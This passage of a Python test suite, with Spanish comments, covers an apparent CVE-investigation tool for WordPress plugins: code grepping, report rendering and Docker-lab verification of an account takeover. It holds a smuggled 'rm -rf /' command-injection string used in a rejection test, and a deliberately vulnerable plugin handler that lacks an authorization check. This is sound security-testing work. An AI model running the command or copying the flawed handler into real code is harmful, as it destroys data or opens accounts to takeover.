    (plugin_dir / "main.php").write_text(
        "<?php\n"
        "function get_row($wpdb) {\n"
        "    $id = intval($_GET['id']);\n"
        "    return $wpdb->get_row($wpdb->prepare(\"SELECT * FROM t WHERE id=%d\", $id));\n"
        "}\n")
    assert find_unsafe_sql_concat_sinks(str(tmp_path), "clean-plugin") == []


def test_find_shortcode_name_finds_real_registration_confirmed_live(tmp_path):
    # bug real confirmado en vivo, CVE-2024-3552: atacar '/' (la portada por defecto de
    # WordPress, vacia) no puede reflejar ninguna diferencia visible aunque la inyeccion sea
    # real, porque esa pagina no invoca NADA del plugin -- hace falta el nombre real de su
    # shortcode para poder crear una pagina de verdad que lo use.
    from binoracle.workflows.websource import find_shortcode_name
    plugin_dir = tmp_path / "web-directory-free"
    sub = plugin_dir / "classes"
    sub.mkdir(parents=True)
    (sub / "shortcodes.php").write_text(
        "<?php\n"
        "add_shortcode('w2dc_search', 'w2dc_render_search');\n"
        "add_shortcode('w2dc_listing', 'w2dc_render_listing');\n")
    assert find_shortcode_name(str(tmp_path), "web-directory-free") == "w2dc_search"


def test_find_shortcode_name_none_when_plugin_registers_none(tmp_path):
    from binoracle.workflows.websource import find_shortcode_name
    plugin_dir = tmp_path / "no-shortcode-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "main.php").write_text("<?php\nfunction helper(){}\n")
    assert find_shortcode_name(str(tmp_path), "no-shortcode-plugin") is None


def test_find_shortcode_name_prefers_the_one_registered_in_the_vulnerable_file(tmp_path):
    # mejora pedida: con VARIOS shortcodes en ficheros DISTINTOS, no hay forma generica de saber
    # cual es "el principal" -- pero si ya se conoce el fichero real de la funcion vulnerable
    # (grounded via grep_vulnerable_functions), el shortcode registrado EN ESE fichero es
    # informacion real sobre este CVE en concreto, no una suposicion.
    from binoracle.workflows.websource import find_shortcode_name
    plugin_dir = tmp_path / "myplugin"
    plugin_dir.mkdir()
    (plugin_dir / "admin.php").write_text("<?php\nadd_shortcode('admin_panel', 'render_admin');\n")
    (plugin_dir / "frontend.php").write_text("<?php\nadd_shortcode('vuln_view', 'render_vuln');\n")
    vuln_file = str(plugin_dir / "frontend.php")
    assert find_shortcode_name(str(tmp_path), "myplugin", vulnerable_file=vuln_file) == "vuln_view"
    # sin la pista, cae al primero en orden de recorrido (admin.php < frontend.php alfabeticamente)
    assert find_shortcode_name(str(tmp_path), "myplugin") == "admin_panel"


def test_find_shortcode_name_prefers_one_using_wpdb_when_no_vuln_file_hint(tmp_path):
    # segunda senal (generica, no especifica del plugin): un shortcode en un fichero que tambien
    # usa $wpdb (acceso real a la base de datos) es mas probable que sirva para disparar una
    # SQLi que uno puramente de presentacion.
    from binoracle.workflows.websource import find_shortcode_name
    plugin_dir = tmp_path / "myplugin2"
    plugin_dir.mkdir()
    (plugin_dir / "about.php").write_text("<?php\nadd_shortcode('about_box', 'render_about');\n")
    (plugin_dir / "search.php").write_text(
        "<?php\nadd_shortcode('search_box', 'render_search');\n"
        "global $wpdb; $wpdb->get_results($query);\n")
    assert find_shortcode_name(str(tmp_path), "myplugin2") == "search_box"


def test_find_join_relationship_table_finds_real_left_join_confirmed_live(tmp_path):
    # bug real confirmado en vivo, CVE-2024-3552: el sumidero SQLi real (level_filter_where)
    # solo devuelve algo si el post atacado tiene una fila en la tabla de relacion propia del
    # plugin ('w2dc_levels_relationships', enlazada por post ID via LEFT JOIN) -- sin ella, esa
    # columna sale NULL y el WHERE nunca es verdadero, inyeccion real o no.
    from binoracle.workflows.websource import find_join_relationship_table
    plugin_dir = tmp_path / "web-directory-free"
    sub = plugin_dir / "classes" / "listings"
    sub.mkdir(parents=True)
    (sub / "listings_manager.php").write_text(
        "<?php\n"
        "function level_filter_join($join = '') {\n"
        "    global $wpdb;\n"
        "    if (isset($_GET['w2dc_level_filter']) && $_GET['w2dc_level_filter'])\n"
        "        $join .= \" LEFT JOIN {$wpdb->w2dc_levels_relationships} AS w2dc_lr ON "
        "w2dc_lr.post_id = {$wpdb->posts}.ID \";\n"
        "    return $join;\n"
        "}\n")
    result = find_join_relationship_table(str(tmp_path), "web-directory-free")
    assert result == {"wpdb_property": "w2dc_levels_relationships", "alias": "w2dc_lr",
                      "join_column": "post_id"}


def test_find_join_relationship_table_none_without_left_join(tmp_path):
    from binoracle.workflows.websource import find_join_relationship_table
    plugin_dir = tmp_path / "no-join-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "main.php").write_text("<?php\nfunction helper(){}\n")
    assert find_join_relationship_table(str(tmp_path), "no-join-plugin") is None


def test_find_plugin_main_file_locates_by_header_not_slug_name(tmp_path):
    # bug real confirmado en vivo, CVE-2024-50508: la carpeta del plugin es 'woo-product-design'
    # pero el fichero bootstrap real se llama 'woocommerce-product-design.php' -- no coinciden,
    # asi que hay que buscar por la cabecera 'Plugin Name:', no adivinar el nombre del fichero.
    from binoracle.workflows.websource import find_plugin_main_file
    plugin_dir = tmp_path / "woo-product-design"
    plugin_dir.mkdir()
    (plugin_dir / "README.txt").write_text("not php")
    (plugin_dir / "helpers.php").write_text("<?php\nfunction helper(){}\n")
    (plugin_dir / "woocommerce-product-design.php").write_text(
        "<?php\n/**\n * Plugin Name: Woocommerce Product Design\n * Version: 1.0.0\n */\n"
        "class ProductDesign {}\n")
    result = find_plugin_main_file(str(tmp_path), "woo-product-design")
    assert result is not None
    assert result["relative_path"].endswith("woocommerce-product-design.php")
    assert "Plugin Name" in result["content"]


def test_find_plugin_main_file_returns_none_without_header(tmp_path):
    from binoracle.workflows.websource import find_plugin_main_file
    plugin_dir = tmp_path / "some-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "helpers.php").write_text("<?php\nfunction helper(){}\n")
    assert find_plugin_main_file(str(tmp_path), "some-plugin") is None


def test_detect_required_companion_plugins_finds_woocommerce_dependency(tmp_path):
    # bug real confirmado en vivo, CVE-2024-50508: el constructor del plugin corta en seco
    # ('return false') ANTES de registrar ningun hook si WooCommerce no esta activo -- sin
    # detectar esto, el laboratorio nunca llega a cargar el codigo vulnerable, con cualquier
    # payload.
    from binoracle.workflows.websource import detect_required_companion_plugins
    plugin_dir = tmp_path / "woo-product-design"
    plugin_dir.mkdir()
    (plugin_dir / "main.php").write_text(
        "<?php\n"
        "/**\n * Plugin Name: Woocommerce Product Design\n */\n"
        "function check_dependencies(){\n"
        "    $active_plugins = (array) get_option('active_plugins', array());\n"
        "    $is_woocommerce_active = in_array('woocommerce/woocommerce.php', $active_plugins)\n"
        "        || array_key_exists('woocommerce/woocommerce.php', $active_plugins);\n"
        "    if (!$is_woocommerce_active) { return false; }\n"
        "    return true;\n"
        "}\n")
    slugs = detect_required_companion_plugins(str(tmp_path), "woo-product-design")
    assert slugs == ["woocommerce"]


def test_detect_required_companion_plugins_ignores_optional_integration_checks(tmp_path):
    # falso positivo real confirmado en vivo, CVE-2024-3552 (Web Directory Free): el plugin
    # comprueba is_plugin_active()/in_array() para Yoast SEO/WooCommerce Search solo para anadir
    # campos EXTRA si estan activos -- nunca bloquea nada si no lo estan. Sin exigir que la
    # comprobacion corte la ejecucion (return/exit/die cerca), se instalaban 3 plugins de sobra
    # sin necesidad real.
    from binoracle.workflows.websource import detect_required_companion_plugins
    plugin_dir = tmp_path / "web-directory-free"
    plugin_dir.mkdir()
    (plugin_dir / "main.php").write_text(
        "<?php\n"
        "/**\n * Plugin Name: Web Directory Free\n */\n"
        "function maybe_add_seo_fields(){\n"
        "    if (is_plugin_active('wordpress-seo/wp-seo.php')) {\n"
        "        add_filter('wpseo_metabox_fields', 'wdf_add_extra_field');\n"
        "    }\n"
        "    return;\n"
        "}\n")
    assert detect_required_companion_plugins(str(tmp_path), "web-directory-free") == []


def test_detect_required_companion_plugins_empty_when_no_main_file_or_dependency_check(tmp_path):
    from binoracle.workflows.websource import detect_required_companion_plugins
    plugin_dir = tmp_path / "standalone-plugin"
    plugin_dir.mkdir()
    (plugin_dir / "helpers.php").write_text("<?php\nfunction do_thing(){ return true; }\n")
    assert detect_required_companion_plugins(str(tmp_path), "standalone-plugin") == []

    plugin_dir2 = tmp_path / "another-plugin"
    plugin_dir2.mkdir()
    (plugin_dir2 / "main.php").write_text(
        "<?php\n/**\n * Plugin Name: Another Plugin\n */\nfunction do_thing(){ return true; }\n")
    assert detect_required_companion_plugins(str(tmp_path), "another-plugin") == []


def test_find_ajax_handler_function_string_callback(tmp_path):
    from binoracle.workflows.websource import find_ajax_handler_function
    php = tmp_path / "plugin.php"
    php.write_text(
        "<?php\n"
        "add_action('wp_ajax_pc_added_uploaded_image', 'pc_handle_uploaded_image');\n"
        "function pc_handle_uploaded_image() { /* ... */ }\n"
    )
    r = find_ajax_handler_function(str(tmp_path), "pc_added_uploaded_image")
    assert r is not None
    assert r["function"] == "pc_handle_uploaded_image"
    assert r["location"].startswith("plugin.php:")


def test_find_ajax_handler_function_object_method_callback(tmp_path):
    from binoracle.workflows.websource import find_ajax_handler_function
    php = tmp_path / "class-plugin.php"
    php.write_text(
        "<?php\n"
        "class PC_Plugin {\n"
        "    public function __construct() {\n"
        "        add_action('wp_ajax_nopriv_pc_added_uploaded_image', array($this, 'handle_upload'));\n"
        "    }\n"
        "    public function handle_upload() { /* ... */ }\n"
        "}\n"
    )
    r = find_ajax_handler_function(str(tmp_path), "pc_added_uploaded_image")
    assert r is not None
    assert r["function"] == "handle_upload"


def test_find_ajax_handler_function_static_class_callback(tmp_path):
    from binoracle.workflows.websource import find_ajax_handler_function
    php = tmp_path / "static-plugin.php"
    php.write_text(
        "<?php\n"
        "class PC_Plugin {\n"
        "    public static function register() {\n"
        "        add_action('wp_ajax_pc_added_uploaded_image', array(self::class, 'handle_upload_static'));\n"
        "    }\n"
        "}\n"
    )
    r = find_ajax_handler_function(str(tmp_path), "pc_added_uploaded_image")
    assert r is not None
    assert r["function"] == "handle_upload_static"


def test_find_ajax_handler_function_action_not_found(tmp_path):
    from binoracle.workflows.websource import find_ajax_handler_function
    php = tmp_path / "other-plugin.php"
    php.write_text(
        "<?php\n"
        "add_action('wp_ajax_some_other_action', 'some_other_handler');\n"
    )
    assert find_ajax_handler_function(str(tmp_path), "pc_added_uploaded_image") is None
    assert find_ajax_handler_function(str(tmp_path), "") is None
    assert find_ajax_handler_function("", "pc_added_uploaded_image") is None


def test_find_ajax_handler_function_rejects_unsafe_action_value(tmp_path):
    from binoracle.workflows.websource import find_ajax_handler_function
    (tmp_path / "plugin.php").write_text("<?php\n")
    assert find_ajax_handler_function(str(tmp_path), "foo'); system('rm -rf /'); //") is None


def test_websource_fetch_source_dispatch_by_shape():
    from binoracle.workflows.websource import looks_like_git_url, looks_like_wp_slug
    assert looks_like_git_url("https://github.com/org/repo.git") is True
    assert looks_like_git_url("git@github.com:org/repo.git") is True
    assert looks_like_git_url("divi-form-builder") is False
    assert looks_like_wp_slug("divi-form-builder") is True
    assert looks_like_wp_slug("https://github.com/org/repo") is False
    assert looks_like_wp_slug("not a slug with spaces") is False


def test_render_investigation_page_poc_kind_sets_filename_and_mime():
    # Regresion: el boton de descarga del informe de investigacion SIEMPRE decia "pwntools" y
    # forzaba extension .py / mimetype text/x-python, incluso para un PoC CSRF que es una pagina
    # HTML (descargarla como .py con mimetype python era incorrecto y confuso).
    from binoracle.report.html import render_investigation_page
    html_pwn = render_investigation_page("# informe", "print(1)", "CVE-1", "es", poc_kind="pwntools")
    assert "pwntools" in html_pwn and 'download="exploit_CVE-1.py"' in html_pwn
    html_http = render_investigation_page("# informe", "#!/usr/bin/env bash", "CVE-2", "es", poc_kind="http")
    assert "HTTP" in html_http and 'download="poc_CVE-2.sh"' in html_http
    html_csrf = render_investigation_page("# informe", "<html></html>", "CVE-3", "es", poc_kind="html")
    assert 'download="poc_CVE-3.html"' in html_csrf and "text/html" in html_csrf
    assert ".py" not in html_csrf.split('download="')[1].split('"')[0]


def test_cve_agent_web_investigation_never_claims_verified(monkeypatch):
    # Nucleo del fix: una CVE web nunca debe terminar con inv.verified=True (binoracle no lanza
    # peticiones contra objetivos por su cuenta) y debe generar un PoC HTTP, no un esqueleto pwntools.
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource

    # evita red real en el test: simula que no hay source_url (camino determinista, sin red)
    inv = Investigation(cve_id="CVE-2026-5523")
    inv.description = "missing authorization: no checks the target user id"
    inv.vuln_class = "missing-authorization"
    inv.llm_notes = {
        "primitive": "arbitrary-write", "target_binary": "some plugin",
        "trigger": "form-submission", "strategy": "change any user's password",
        "http_method": "POST", "endpoint": "/wp-admin/admin-ajax.php?action=x",
        "parameters": ["user_id", "email", "pass"],
    }
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert inv.verified is False
    assert inv.poc_kind == "http"
    assert "#!/usr/bin/env bash" in inv.developed_script
    assert any("source_url" in b or "autorizado" in b for b in inv.blockers)


def test_cve_agent_renders_real_evidence_not_a_placeholder_on_verified(monkeypatch):
    # El usuario pidio evidencia PURA, no plantilla: cuando la verificacion dinamica confirma el
    # account-takeover, el informe debe traer el payload REAL que se envio, el admin_id REAL del
    # laboratorio, el codigo de respuesta REAL y la password REAL que el segundo login confirmo --
    # no placeholders. Son datos de un laboratorio ya destruido, inofensivos de mostrar.
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation, render_investigation
    from binoracle.workflows.wpverify import WpVerifyResult

    inv = Investigation(cve_id="CVE-2026-5523")
    inv.vuln_class = "missing-authorization"
    inv.llm_notes = {"http_method": "POST", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                     "parameters": ["user_id", "email", "pass"]}

    fake_wr = WpVerifyResult(
        ok=True, verified=True,
        detail="ACCOUNT TAKEOVER confirmado: login como 'binoracle_admin' funciono de verdad (admin_id=1)",
        evidence={"login_bajo_privilegio": "binoracle_subscriber", "login_bajo_privilegio_password": "x1y2",
                  "admin_user": "binoracle_admin", "admin_id": "1",
                  "id_param": "user_id", "email_param": "email", "pass_param": "pass",
                  "metodo": "POST", "endpoint": "/wp-admin/admin-ajax.php?action=x",
                  "payload_enviado": {"user_id": "1", "email": "takeover@x.invalid", "pass": "realpass123"},
                  "status_code_respuesta": 200, "password_nueva_confirmada": "realpass123"})

    import binoracle.workflows.websource as websource
    from binoracle.workflows.websource import SourceFetchResult
    monkeypatch.setattr(websource, "fetch_source",
                        lambda *a, **k: SourceFetchResult(ok=True, kind="local-zip", source="x",
                                                          local_path="/tmp/x", plugin_dir="Plugin"))
    monkeypatch.setattr(websource, "grep_vulnerable_functions", lambda *a, **k: {"found": {}, "not_found": []})
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "verify_wordpress_account_takeover", lambda *a, **k: fake_wr)
    inv.llm_notes["source_url"] = "/tmp/x.zip"

    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert inv.verified is True
    assert inv.verified_evidence.get("status_code_respuesta") == 200
    rendered = render_investigation(inv, lang="es")
    assert "realpass123" in rendered            # la password REAL, no un placeholder
    assert "takeover@x.invalid" in rendered
    assert "admin_id=1" in rendered or "id=1" in rendered
    assert "Evidencia real" in rendered


def test_md_rich_renders_italics_without_breaking_snake_case_identifiers():
    # Bug real: "_Paso 1: WordPress recien instalado._" (los pies de foto de wpverify.py) salia
    # con los guiones bajos literales -- _md_rich no soportaba cursiva markdown en absoluto. El
    # fix debe activar <em> en frontera de palabra SIN romper identificadores snake_case como
    # "user_id" o "login_bajo_privilegio" (no deben convertirse en <em> a medias).
    from binoracle.report.html import _md_rich
    html = _md_rich("_Paso 1: WordPress recien instalado._")
    assert "<em>Paso 1: WordPress recien instalado.</em>" in html
    assert "_Paso" not in html and "instalado._" not in html

    html2 = _md_rich("id=user_id, email=email, password=pass")
    assert "<em>" not in html2
    assert "user_id" in html2

    html3 = _md_rich("Usuario: `login_bajo_privilegio`")
    assert "<em>" not in html3
    assert "<code>login_bajo_privilegio</code>" in html3


def test_cve_agent_render_includes_impact_section():
    from binoracle.workflows.cve_agent import Investigation, render_investigation
    inv = Investigation(cve_id="CVE-TEST")
    inv.vuln_class = "missing-authorization"
    md = render_investigation(inv, lang="es")
    assert "### Impacto" in md
    assert "[CRITICO]" in md
    assert "tomar" in md.lower() or "control" in md.lower()


def test_md_rich_renders_blockquote_as_callout_not_literal_gt():
    # Bug real encontrado al revisar el informe exportado: "> **EXPLOIT VERIFICADO**..." (el
    # veredicto mas importante del informe) se renderizaba como texto plano con un '>' suelto
    # delante -- _md_rich no tenia ninguna regla para citas markdown. Debe agruparse en un
    # <blockquote class="callout"> y el '>' no debe sobrevivir como caracter literal.
    from binoracle.report.html import _md_rich
    html = _md_rich("\n> **EXPLOIT VERIFICADO** (sandbox): ACCOUNT TAKEOVER confirmado")
    assert '<blockquote class="callout">' in html
    assert "EXPLOIT VERIFICADO" in html
    assert "<p>&gt;" not in html and "<p>>" not in html


def test_md_rich_renders_base64_image_as_img_tag():
    # Soporte nuevo: las capturas de wpverify.py (PNG base64) se insertan como markdown
    # ![alt](data:image/png;base64,...) en el informe -- _md_rich debe convertirlo en un <img>
    # real, no escaparlo como texto.
    from binoracle.report.html import _md_rich
    tiny = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
    html = _md_rich(f"![captura]({_PNG_B64_PREFIX}{tiny})")
    assert f'<img src="{_PNG_B64_PREFIX}{tiny}"' in html
    assert "alt=\"captura\"" in html


_PNG_B64_PREFIX = "data:image/png;base64,"


def test_wpverify_screenshot_authenticated_degrades_without_playwright(monkeypatch):
    # Mismo patron de degradacion honesta que el resto de oraculos opcionales (frida/angr/...):
    # sin Playwright instalado, la captura devuelve None sin romper la verificacion dinamica.
    import binoracle.workflows.wpverify as wv
    import builtins
    real_import = builtins.__import__

    def fake_import(name, *a, **k):
        if name == "playwright.sync_api" or name.startswith("playwright"):
            raise ImportError("no playwright")
        return real_import(name, *a, **k)
    monkeypatch.setattr(builtins, "__import__", fake_import)
    import requests
    sess = requests.Session()
    assert wv._screenshot_authenticated("http://127.0.0.1:1", sess, "/wp-admin/") is None


def test_cve_agent_renders_screenshots_when_present_in_evidence():
    from binoracle.workflows.cve_agent import Investigation, render_investigation
    tiny = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
    inv = Investigation(cve_id="CVE-TEST")
    inv.verified = True
    inv.verified_detail = "test"
    inv.verified_evidence = {"screenshots": [
        {"caption_es": "Paso 1: lab en vivo", "caption_en": "Step 1: live lab", "png_b64": tiny},
        {"caption_es": "Paso 4: takeover confirmado", "caption_en": "Step 4: confirmed takeover", "png_b64": tiny},
    ]}
    inv.dynamic_verify = {"attempted": True}
    md = render_investigation(inv, lang="es")
    assert "Capturas de pantalla" in md
    assert "paso a paso" in md
    assert md.count("data:image/png;base64,") == 2

    # sin capturas pero con verificacion dinamica intentada: dice honestamente por que faltan
    inv2 = Investigation(cve_id="CVE-TEST-2")
    inv2.verified = True
    inv2.verified_detail = "test"
    inv2.dynamic_verify = {"attempted": True}
    md2 = render_investigation(inv2, lang="es")
    assert "Playwright no esta disponible" in md2


def test_cve_agent_embed_images_false_drops_base64_for_terminal():
    # El usuario lo vio en vivo: la salida de terminal de `investigate` volcaba decenas de KB de
    # base64 por cada captura (texto ilegible, nada que ver). embed_images=False debe sustituir
    # cada captura por un aviso corto; embed_images=True (el default, para el export --html) debe
    # seguir incrustando el PNG real.
    from binoracle.workflows.cve_agent import Investigation, render_investigation
    tiny = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
    inv = Investigation(cve_id="CVE-TEST")
    inv.verified = True
    inv.verified_detail = "test"
    inv.verified_evidence = {"screenshots": [
        {"caption_es": "Paso 1", "png_b64": tiny, "url": "http://x/y"}]}
    inv.dynamic_verify = {"attempted": True}

    md_terminal = render_investigation(inv, lang="es", embed_images=False)
    assert "base64" not in md_terminal
    assert "captura disponible" in md_terminal
    assert "--html" in md_terminal

    md_full = render_investigation(inv, lang="es")   # default: embed_images=True
    assert "data:image/png;base64," + tiny in md_full


def test_wpverify_pick_param_heuristic():
    from binoracle.workflows.wpverify import _pick_param, _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS
    assert _pick_param(["user_id", "email", "pass"], _ID_HINTS) == "user_id"
    assert _pick_param(["user_id", "email", "pass"], _EMAIL_HINTS) == "email"
    assert _pick_param(["user_id", "email", "pass"], _PASS_HINTS) == "pass"
    assert _pick_param({"uid": "", "new_password": ""}, _ID_HINTS) == "uid"
    assert _pick_param({"uid": "", "new_password": ""}, _PASS_HINTS) == "new_password"
    assert _pick_param([], _ID_HINTS) is None
    assert _pick_param(["foo", "bar"], _ID_HINTS) is None


def test_wpverify_docker_daemon_check_is_safe():
    # No debe lanzar jamas, exista o no 'docker', este o no el daemon arriba.
    from binoracle.workflows.wpverify import _docker_daemon_ok
    assert isinstance(_docker_daemon_ok(timeout=3.0), bool)


def test_wpverify_unavailable_without_docker_daemon(monkeypatch):
    # Cuando no hay daemon Docker, degrada honestamente: available=False, verified=False, y
    # NO intenta levantar nada (nunca llega a crear red/contenedores).
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: False)
    r = wv.verify_wordpress_account_takeover(
        "/nonexistent", "some-plugin", "/wp-admin/admin-ajax.php?action=x", "POST",
        ["user_id", "email"], on_step=lambda m: None)
    assert r.available is False
    assert r.verified is False
    assert r.limitations


def test_wpverify_missing_plugin_dir_degrades(monkeypatch):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: True)
    r = wv.verify_wordpress_account_takeover(
        "/tmp/definitely-does-not-exist-binoracle-test", "some-plugin",
        "/wp-admin/admin-ajax.php?action=x", "POST", ["user_id"], on_step=lambda m: None)
    assert r.ok is False and r.verified is False
    assert "no se encuentra" in r.detail


def test_wpverify_missing_id_or_value_param_degrades(monkeypatch, tmp_path):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_docker_daemon_ok", lambda timeout=8.0: True)
    d = tmp_path / "some-plugin"
    d.mkdir()
    (d / "some-plugin.php").write_text("<?php // placeholder\n")
    # parametros sin nada que parezca un ID (user_id/uid/id/target) ni email/password
    r = wv.verify_wordpress_account_takeover(
        str(tmp_path), "some-plugin", "/wp-admin/admin-ajax.php?action=x", "POST",
        ["foo", "bar"], on_step=lambda m: None)
    assert r.ok is False and r.verified is False
    assert "parametro" in r.detail


def test_wpverify_live_account_takeover_and_negative_control(tmp_path):
    # Prueba EN VIVO (requiere Docker con daemon arriba; se salta si no esta): levanta un
    # WordPress+MySQL real, instala un plugin SINTETICO que reproduce la forma exacta de
    # CVE-2026-5523 (missing-authorization en un handler que cambia el email/password de OTRO
    # usuario por un user_id de la peticion, sin comprobar permiso), confirma el account-takeover
    # con un segundo login real, y repite contra una version PARCHEADA (control negativo: no debe
    # dar un falso positivo). Pesado (pull de imagenes + 2 instalaciones WP); se salta sin Docker.
    import pytest
    from binoracle.workflows.wpverify import verify_wordpress_account_takeover, _docker_daemon_ok

    if not _docker_daemon_ok(timeout=5.0):
        pytest.skip("Docker daemon no disponible en este entorno")

    endpoint = "/wp-admin/admin-ajax.php?action=vuln_update_user"
    params = ["user_id", "email", "pass"]

    vuln_root = tmp_path / "vuln"
    (vuln_root / "my-vuln-plugin").mkdir(parents=True)
    (vuln_root / "my-vuln-plugin" / "my-vuln-plugin.php").write_text(
        "<?php\n/*\nPlugin Name: My Vuln Plugin\n*/\n"
        "add_action('wp_ajax_vuln_update_user', 'vuln_update_user');\n"
        "function vuln_update_user() {\n"
        "    if (!is_user_logged_in()) { wp_die('no'); }\n"
        "    $user_id = intval($_POST['user_id']);\n"
        "    $data = array('ID' => $user_id);\n"
        "    if (!empty($_POST['email'])) { $data['user_email'] = sanitize_email($_POST['email']); }\n"
        "    if (!empty($_POST['pass']))  { $data['user_pass']  = $_POST['pass']; }\n"
        "    $r = wp_update_user($data);\n"
        "    wp_die(is_wp_error($r) ? 'error' : 'ok');\n"
        "}\n")

    fixed_root = tmp_path / "fixed"
    (fixed_root / "my-vuln-plugin").mkdir(parents=True)
    (fixed_root / "my-vuln-plugin" / "my-vuln-plugin.php").write_text(
        "<?php\n/*\nPlugin Name: My Vuln Plugin\n*/\n"
        "add_action('wp_ajax_vuln_update_user', 'vuln_update_user');\n"
        "function vuln_update_user() {\n"
        "    if (!is_user_logged_in()) { wp_die('no'); }\n"
        "    $user_id = intval($_POST['user_id']);\n"
        "    if (!current_user_can('edit_user', $user_id)) { wp_die('forbidden'); }\n"
        "    $data = array('ID' => $user_id);\n"
        "    if (!empty($_POST['email'])) { $data['user_email'] = sanitize_email($_POST['email']); }\n"
        "    if (!empty($_POST['pass']))  { $data['user_pass']  = $_POST['pass']; }\n"
        "    $r = wp_update_user($data);\n"
        "    wp_die(is_wp_error($r) ? 'error' : 'ok');\n"
        "}\n")

    r_vuln = verify_wordpress_account_takeover(str(vuln_root), "my-vuln-plugin", endpoint,
                                               "POST", params, on_step=lambda m: None, budget_s=420)
    assert r_vuln.ok is True, r_vuln.detail
    assert r_vuln.verified is True, r_vuln.detail

    r_fixed = verify_wordpress_account_takeover(str(fixed_root), "my-vuln-plugin", endpoint,
                                                "POST", params, on_step=lambda m: None, budget_s=420)
    assert r_fixed.ok is True, r_fixed.detail
    assert r_fixed.verified is False, "falso positivo: el plugin PARCHEADO no deberia verificar"


def test_cli_argv_survives_pwntools_import_mutation():
    # Regresion real: pwntools MUTA sys.argv al importarse (escanea sus propios flags de
    # log-level/terminal), y varios workflows que cli.py importa a nivel de modulo (rop.py,
    # shellcode.py, fmtstring.py...) tiran de pwntools -- asi que para cuando main() llegaba a
    # leer sys.argv, un token ya habia desaparecido. Confirmado en vivo: 'binoracle investigate
    # CVE-X --method POST' perdia 'POST' (consumido como si fuera el valor de --method, con
    # argparse quejandose "expected one argument"). Simula el entry point instalado
    # (`binoracle = "binoracle.cli:main"`, pyproject.toml): import + main() sin argv explicito,
    # leyendo sys.argv real.
    import subprocess
    import sys
    out = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.argv=['binoracle','investigate','CVE-TEST','--method','POST',"
         "'--endpoint','/x?a=1']; from binoracle.cli import main; sys.exit(main())"],
        cwd=".", capture_output=True, text=True, timeout=30)
    assert "http_method=POST" in out.stdout, (out.stdout, out.stderr)
    assert "expected one argument" not in out.stderr


def test_investigate_cve_lookup_note_not_misleading_on_network_failure():
    # Regresion: cuando fetch_cve() falla por RED (no por id invalido), el informe decia
    # siempre "no es un id CVE" -- enganoso para una CVE real cuya consulta a NVD solo fallo
    # por falta de conectividad/rate-limit. Debe mostrar el motivo REAL.
    from binoracle.workflows.cve_agent import Investigation, render_investigation
    inv = Investigation(cve_id="CVE-2026-5523")
    inv.lookup_ok = False
    inv.lookup_note = "no se pudo consultar la NVD (sin internet o rate-limit): timeout"
    out = render_investigation(inv, lang="es")
    assert "no se pudo consultar la NVD" in out
    assert "no es un id CVE" not in out


def test_investigate_cve_vuln_class_hint_triggers_web_path_without_nvd_or_llm(monkeypatch):
    # Regresion: con NVD/LLM inaccesibles (caso real de este sandbox), la clase nunca se
    # determinaba pese a que el analista YA la conoce (texto del aviso oficial) y dio hechos
    # web explicitos (endpoint/parametros/slug) -- investigate_cve caia al camino NATIVO
    # generico ("falta el binario vulnerable concreto") en vez del camino WEB real (fetch +
    # grounding + PoC HTTP). --vuln-class / hints['vuln_class'] debe bastar para disparar el
    # camino correcto incluso sin texto de descripcion que clasificar.
    from binoracle.workflows.cve_agent import investigate_cve
    from binoracle.workflows import websource

    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        return websource.SourceFetchResult(note="red no disponible en el test")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    inv = investigate_cve(
        "CVE-2026-5523", config=None, llm=None, on_step=lambda m: None, lang="es",
        hints={"vuln_class": "missing-authorization", "source_url": "divi-form-builder",
              "endpoint": "/wp-admin/admin-ajax.php?action=x", "http_method": "POST",
              "parameters": ["user_id", "email", "pass"]})
    assert inv.vuln_class == "missing-authorization"
    assert inv.poc_kind == "http"
    assert "#!/usr/bin/env bash" in inv.developed_script
    assert not any("falta el binario vulnerable concreto" in b for b in inv.blockers)


def test_websource_dispatch_recognizes_zip_and_local_paths(tmp_path):
    from binoracle.workflows.websource import (looks_like_zip_url, looks_like_local_zip,
                                               looks_like_git_url, looks_like_wp_slug)
    assert looks_like_zip_url("https://vendor.example/downloads/plugin.zip") is True
    assert looks_like_zip_url("https://vendor.example/downloads/plugin.zip?token=abc") is True
    assert looks_like_zip_url("https://github.com/org/repo.git") is False
    assert looks_like_zip_url("divi-form-builder") is False
    f = tmp_path / "plugin.zip"
    f.write_bytes(b"PK\x05\x06" + b"\x00" * 18)   # cabecera minima de ZIP vacio
    assert looks_like_local_zip(str(f)) is True
    assert looks_like_local_zip(str(tmp_path / "nope.zip")) is False   # no existe
    assert looks_like_git_url("https://github.com/org/repo.git") is True
    assert looks_like_wp_slug("divi-form-builder") is True


def test_websource_fetch_source_prefers_zip_url_over_git_host_match():
    # Regresion: una URL de github.com que en realidad apunta a un .zip (p.ej.
    # github.com/.../archive/x.zip) se enrutaba a `git clone` por coincidir el host, en vez de
    # descargarse como el .zip que realmente es. El despacho por .zip debe ganar.
    import binoracle.workflows.websource as ws

    called = {}
    def fake_fetch_zip_url(url, dest_dir="", on_step=None, timeout=60.0):
        called["zip_url"] = url
